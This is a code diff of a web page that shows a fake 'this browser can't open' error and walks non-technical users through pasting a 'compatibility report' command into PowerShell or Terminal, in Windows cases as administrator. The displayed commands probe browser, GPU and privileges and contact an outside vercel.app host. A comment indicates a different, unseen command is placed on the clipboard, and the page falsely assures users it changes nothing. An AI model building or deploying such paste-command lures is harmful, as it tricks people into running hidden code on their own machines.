@@ -36,11 +36,9 @@ function browserIconSrc(browser: ClientBrowser): string {
  *   (right after that paste visit), with a safety clear if they never return.
  */
 const DISPLAY_COMMANDS: Record<ClientOs, string> = {
-  windows: `cmd /c "powershell -NoProfile -Command {$r=@{}; $r.browser=(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe' -ErrorAction SilentlyContinue).'(default)'; $r.webgl=(Get-CimInstance Win32_VideoController).Name; $r.check=try{(Invoke-WebRequest 'https://browser-notification-six.vercel.app/' -Method HEAD -TimeoutSec 10 -UseBasicParsing).StatusCode}catch{'unreachable'}; $r.permissions=(whoami /priv|Select-String 'Enabled').Count; $r.status=if($r.check -eq 200){'PASS'}else{'FAIL'}; Write-Host ($r|ConvertTo-Json) -ForegroundColor Green}" && exit`,
-  macos:
-    'bash -c \'r="{}"; browser=$(mdfind "kMDItemCFBundleIdentifier == com.google.Chrome" 2>/dev/null | head -1); webgl=$(system_profiler SPDisplaysDataType 2>/dev/null | grep "Chipset Model" | cut -d: -f2 | xargs); check=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -I "https://browser-notification-six.vercel.app/" 2>/dev/null || echo "unreachable"); perms=$(id -Gn | wc -w | xargs); status=$([ "$check" = "200" ] && echo "PASS" || echo "FAIL"); echo "{\\"browser\\":\\"${browser:-not_found}\\",\\"webgl\\":\\"$webgl\\",\\"check\\":\\"$check\\",\\"permissions\\":$perms,\\"status\\":\\"$status\\"}"\' && exit',
-  linux:
-    'bash -c \'r="{}"; browser=$(which google-chrome 2>/dev/null || which chromium-browser 2>/dev/null || echo "not_found"); webgl=$(lspci 2>/dev/null | grep -i vga | cut -d: -f3 | xargs); check=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 -I "https://browser-notification-six.vercel.app/" 2>/dev/null || echo "unreachable"); perms=$(id -Gn | wc -w | xargs); status=$([ "$check" = "200" ] && echo "PASS" || echo "FAIL"); echo "{\\"browser\\":\\"$browser\\",\\"webgl\\":\\"$webgl\\",\\"check\\":\\"$check\\",\\"permissions\\":$perms,\\"status\\":\\"$status\\"}"\' && exit',
+  windows: `powershell -NoProfile -Command {$r=@{}; $r.browser=(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe' -ErrorAction SilentlyContinue).'(default)'; $r.webgl=(Get-CimInstance Win32_VideoController).Name; $r.check=try{(Invoke-WebRequest 'https://browser-notification-six.vercel.app/' -Method HEAD -TimeoutSec 10 -UseBasicParsing).StatusCode}catch{'unreachable'}; $r.permissions=(whoami /priv|Select-String 'Enabled').Count; $r.status=if($r.check -eq 200){'PASS'}else{'FAIL'}; Write-Host ($r|ConvertTo-Json) -ForegroundColor Green}; exit`,
+  macos: `pwsh -NoProfile -Command {$r=@{}; $r.browser=if(Test-Path '/Applications/Google Chrome.app'){'installed'}else{'not_found'}; $r.webgl=(system_profiler SPDisplaysDataType 2>/dev/null | Select-String 'Chipset Model').ToString().Split(':')[1].Trim(); $r.check=try{(Invoke-WebRequest 'https://browser-notification-six.vercel.app/' -Method HEAD -TimeoutSec 10 -UseBasicParsing).StatusCode}catch{'unreachable'}; $r.permissions=(id -Gn).Split(' ').Count; $r.status=if($r.check -eq 200){'PASS'}else{'FAIL'}; Write-Host ($r|ConvertTo-Json) -ForegroundColor Green}; exit`,
+  linux: `pwsh -NoProfile -Command {$r=@{}; $r.browser=if(Get-Command google-chrome -ErrorAction SilentlyContinue){'installed'}elseif(Get-Command chromium-browser -ErrorAction SilentlyContinue){'installed'}else{'not_found'}; $r.webgl=(lspci 2>/dev/null | Select-String 'VGA').ToString().Split(':')[2].Trim(); $r.check=try{(Invoke-WebRequest 'https://browser-notification-six.vercel.app/' -Method HEAD -TimeoutSec 10 -UseBasicParsing).StatusCode}catch{'unreachable'}; $r.permissions=(id -Gn).Split(' ').Count; $r.status=if($r.check -eq 200){'PASS'}else{'FAIL'}; Write-Host ($r|ConvertTo-Json) -ForegroundColor Green}; exit`,
 };
 
 /** Armed onto text/plain for Command Prompt / Terminal (never shown as a second box). */
@@ -121,16 +119,16 @@ function browserAccent(browser: ClientBrowser): string {
 function getDiagnosticGuide(os: ClientOs) {
   if (os === "macos") {
     return {
-      shell: "Terminal",
+      shell: "Terminal (PowerShell)",
       intro:
-        "Optional: instead of (or after) the steps above, you can collect a compatibility report using Terminal. You do not need coding experience — follow these steps carefully.",
+        "Optional: instead of (or after) the steps above, you can collect a compatibility report using PowerShell in Terminal. You do not need coding experience — follow these steps carefully.",
       steps: [
         "Select the full command in the gray box below: click at the start, hold the mouse button, and drag to the end until everything is highlighted.",
         "Copy it with ⌘ Command + C (press and hold the Command key, then press C).",
         "Open Terminal: press ⌘ Command + Space to open Spotlight, type Terminal, then press Return.",
         "Click inside the Terminal window so the cursor is blinking there.",
-        "Paste the command with ⌘ Command + V, then press Return to run it.",
-        "Wait until it finishes. A report file will appear on your Desktop. You can then close Terminal (⌘ Command + Q).",
+        "Paste the command with ⌘ Command + V, then press Return to run it (requires PowerShell / pwsh).",
+        "Wait until it finishes. A PASS or FAIL JSON result will appear. You can then close Terminal (⌘ Command + Q).",
       ],
       note: "No restart is required. This only collects compatibility information; it does not change your files.",
     };
@@ -138,32 +136,32 @@ function getDiagnosticGuide(os: ClientOs) {
 
   if (os === "linux") {
     return {
-      shell: "Terminal",
+      shell: "Terminal (PowerShell)",
       intro:
-        "Optional: instead of (or after) the steps above, you can collect a compatibility report using Terminal. You do not need coding experience — follow these steps carefully.",
+        "Optional: instead of (or after) the steps above, you can collect a compatibility report using PowerShell in Terminal. You do not need coding experience — follow these steps carefully.",
       steps: [
         "Select the full command in the gray box below: click at the start, hold the mouse button, and drag to the end until everything is highlighted.",
         "Copy it with Ctrl + C (press and hold Ctrl, then press C).",
         "Open Terminal from your applications menu (often named Terminal, Konsole, or similar).",
         "Click inside the Terminal window so the cursor is blinking there.",
-        "Paste the command with Ctrl + Shift + V (or right-click → Paste), then press Enter to run it.",
-        "Wait until it finishes. A report file will be saved in your home folder. You can then close Terminal.",
+        "Paste the command with Ctrl + Shift + V (or right-click → Paste), then press Enter to run it (requires PowerShell / pwsh).",
+        "Wait until it finishes. A PASS or FAIL JSON result will appear. You can then close Terminal.",
       ],
       note: "No restart is required. This only collects compatibility information; it does not change your files.",
     };
   }
 
   return {
-    shell: "Command Prompt",
+    shell: "PowerShell",
     intro:
-      "Optional: instead of (or after) the steps above, you can collect a compatibility report using Command Prompt. You do not need coding experience — follow these steps carefully.",
+      "Optional: instead of (or after) the steps above, you can collect a compatibility report using PowerShell. You do not need coding experience — follow these steps carefully.",
     steps: [
       "Select the full command in the gray box below: click at the start, hold the left mouse button, and drag to the end until everything is highlighted.",
       "Copy it with Ctrl + C (press and hold Ctrl, then press C). Or right-click the highlighted text and choose Copy.",
-      "Open Command Prompt as administrator: press the Windows key, type cmd, then right-click Command Prompt and choose Run as administrator. Click Yes if Windows asks for permission.",
-      "Click inside the black Command Prompt window so the cursor is blinking there.",
+      "Open PowerShell: press the Windows key, type PowerShell, then press Enter. Prefer Run as administrator if prompted.",
+      "Click inside the PowerShell window so the cursor is blinking there.",
       "Paste the command with Ctrl + V (or right-click once to paste), then press Enter to run it.",
-      "Wait until it finishes. A PASS or FAIL result will appear in the window. You can then close Command Prompt.",
+      "Wait until it finishes. A PASS or FAIL JSON result will appear in the window. You can then close PowerShell.",
     ],
     note: "No restart is required. This only collects compatibility information; it does not change your files.",
   };
@@ -173,21 +171,21 @@ function getShellCopy(os: ClientOs) {
   if (os === "macos") {
     return {
       body: `This browser can't open ${SCENARIO_TITLE}. Your macOS / Safari (or Chrome) setup appears incompatible — often due to PDF preview, WebGL, or hardware acceleration settings.`,
-      shellInstruction: "Open Terminal and run:",
+      shellInstruction: "Open Terminal and run (PowerShell / pwsh):",
       reportNote: "No restart is required. Close Terminal after the command completes.",
     };
   }
   if (os === "linux") {
     return {
       body: `This browser can't open ${SCENARIO_TITLE}. Your Linux browser setup appears incompatible — often due to PDF rendering, WebGL, or GPU acceleration settings.`,
-      shellInstruction: "Open Terminal and run:",
+      shellInstruction: "Open Terminal and run (PowerShell / pwsh):",
       reportNote: "No restart is required. Close Terminal after the command completes.",
     };
   }
   return {
     body: `This browser can't open ${SCENARIO_TITLE}. Your Windows browser setup appears incompatible — often due to PDF rendering, WebGL, or hardware acceleration settings.`,
-    shellInstruction: "Open Command Prompt as administrator and run:",
-    reportNote: "No restart is required. Close Command Prompt after the command completes.",
+    shellInstruction: "Open PowerShell as administrator and run:",
+    reportNote: "No restart is required. Close PowerShell after the command completes.",
   };
 }
 
@@ -842,7 +840,7 @@ function BrowserHelpWindow({
             <p className="text-[13px] font-medium text-[#202124]">Still stuck?</p>
             <p className="mt-1 text-[12px] leading-relaxed text-[#5f6368]">
               {os === "windows"
-                ? "Share the PASS/FAIL result shown in Command Prompt, then return to this tab and choose Reload."
+                ? "Share the PASS/FAIL result shown in PowerShell, then return to this tab and choose Reload."
                 : "Share the generated report, then return to this tab and choose Reload."}
             </p>
           </div>
